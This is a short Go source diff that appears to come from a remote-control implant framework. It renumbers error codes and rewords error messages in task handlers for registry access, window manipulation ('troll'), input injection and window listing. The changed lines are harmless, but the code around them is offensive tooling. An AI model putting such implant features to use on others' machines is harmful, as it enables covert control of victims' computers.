@@ -97,7 +97,7 @@ func taskTroll(x context.Context, r data.Reader, _ data.Writer) error {
 		z.Stop()
 		return winapi.SetWindowTransparency(0, 255)
 	}
-	return xerr.Sub("invalid type", 0xD)
+	return xerr.Sub("invalid operation", 0x68)
 }
 func taskCheck(_ context.Context, r data.Reader, w data.Writer) error {
 	s, err := r.StringVal()
@@ -219,7 +219,7 @@ func taskRegistry(_ context.Context, r data.Reader, w data.Writer) error {
 		return registry.ErrUnexpectedType
 	}
 	if len(k) == 0 {
-		return xerr.Sub("empty key name", 0x37)
+		return xerr.Sub("empty key name", 0x6C)
 	}
 	switch w.WriteUint8(o); o {
 	case regOpLs:
@@ -248,7 +248,7 @@ func taskRegistry(_ context.Context, r data.Reader, w data.Writer) error {
 		return err
 	}
 	if len(v) == 0 {
-		return xerr.Sub("empty value name", 0x38)
+		return xerr.Sub("empty value name", 0x6D)
 	}
 	switch o {
 	case regOpGet:
@@ -380,7 +380,7 @@ func taskInteract(_ context.Context, r data.Reader, _ data.Writer) error {
 		}
 		return winapi.SendInput(uintptr(h), t)
 	}
-	return xerr.Sub("invalid type", 0xD)
+	return xerr.Sub("invalid operation", 0x68)
 }
 func taskWindowList(_ context.Context, _ data.Reader, w data.Writer) error {
 	e, err := winapi.TopLevelWindows()
